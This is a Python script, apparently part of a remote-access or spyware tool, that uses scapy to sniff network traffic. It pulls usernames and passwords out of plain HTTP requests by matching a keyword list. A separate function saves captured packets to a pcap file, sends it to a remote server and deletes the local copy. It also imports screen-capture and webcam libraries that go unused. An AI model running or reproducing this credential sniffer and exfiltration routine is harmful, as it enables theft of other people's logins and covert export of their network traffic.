from scapy.all import *
import cv2
import PIL.ImageGrab as ImageGrab
import os
import tempfile
from socket import *
import scapy.all as scapy
from scapy.layers import http

# http://testphp.vulnweb.com/login.php
keywords = ('username', 'uname', 'user', 'login', 'password', 'pass', 'signin', 'signup', 'name')


def sniff_network(server, client, tmout):
    def process_packet(pkt):
        wrpcap('sniff.pcap', pkt, append=True)

    sniff(prn=process_packet, timeout=tmout)
    send_file('sniff.pcap', server, client)
    os.remove('sniff.pcap')


def sniffer(interface=None):
    scapy.sniff(store=False, prn=process_packet)


def get_url(packet):
    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode('utf-8')


def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        try:
            field_load = packet[scapy.Raw].load.decode('utf-8')
            print(field_load)
            for keyword in keywords:
                if keyword in field_load:
                    return field_load
        except UnicodeDecodeError:
            print('error')
            pass


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print('[+] HTTP Requests/URL Requested -> {}'.format(url), '\n')
        cred = get_credentials(packet)
        if cred:
            print('\n\n[+] Possible Credential Information -> {}'.format(cred), '\n\n')


sniffer()
